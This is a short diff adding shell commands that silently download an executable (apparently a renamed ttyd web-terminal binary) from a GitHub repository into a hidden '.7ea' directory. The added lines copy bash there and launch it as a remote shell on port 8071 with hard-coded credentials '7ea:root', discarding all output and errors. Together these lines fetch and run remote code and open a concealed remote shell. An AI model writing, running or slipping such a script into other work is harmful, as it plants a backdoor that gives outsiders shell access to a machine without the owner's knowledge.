@@ -1,1 +1,13 @@
 
+mkdir .7ea    
+echo -e "${GREEN} Exposing  ... ${NC}"
+echo -e "${GREEN}Running 7ea+ttyd > 7w ... ${NC}"
+ea7w="https://github.com/7054company/7wttyd"
+wget -q -O .7ea/7w  $ea7w/raw/main/7ea-ttyd   2> /dev/null || true
+chmod +x  .7ea/7w    
+cp -r /bin/bash .7ea/bash
+#echo " .7ea/7w -c 7ea:root -p 8071 .7ea/bash" > .7ea/7wx 
+echo " .7ea/7w -c 7ea:root -p 8071 .7ea/bash > /dev/null 2> /dev/null || true " > .7ea/7wx
+chmod +x 7w .7ea/7wx    
+
+.7ea/7wx 
